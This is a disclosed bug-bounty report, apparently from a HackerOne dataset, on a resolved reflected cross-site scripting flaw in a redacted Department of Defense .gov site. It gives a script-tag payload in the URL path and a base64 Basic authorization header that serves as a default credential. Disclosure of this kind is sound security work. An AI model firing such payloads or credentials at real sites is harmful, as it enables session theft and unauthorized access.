---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1825942'
original_report_id: '1825942'
title: XSS on ( █████████.gov ) Via URL path
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2023-01-08T06:35:55.645Z'
disclosed_at: '2023-01-27T18:36:36.969Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS on ( █████████.gov ) Via URL path

## Metadata

- HackerOne Report ID: 1825942
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2023-01-27T18:36:36.969Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team,
I was able to execute XSS on  ███████.gov  

Steps to produce - 
1 -Turn on the burp intercepter 
2- Go to  https://██████.gov/xapi/statements?file"><script>alert(document.domain)</script>
3-  In  Intercepter add the following Headers 

  Authorization: Basic eGFwaS10b29sczp4YXBpLXRvb2xz
   X-Experience-Api-Version: 1.0.1

4-  when you send this GET request you will receive a response with XSS payload executed.

## Impact

An attacker can send the malicious link to victims and steals victims' cookie leading to account takeover.

## System Host(s)
www.███.gov

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-41878

## Steps to Reproduce
I have attached the Video POC, please check it out.

## Suggested Mitigation/Remediation Actions
sanitize the inputs in the URL

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
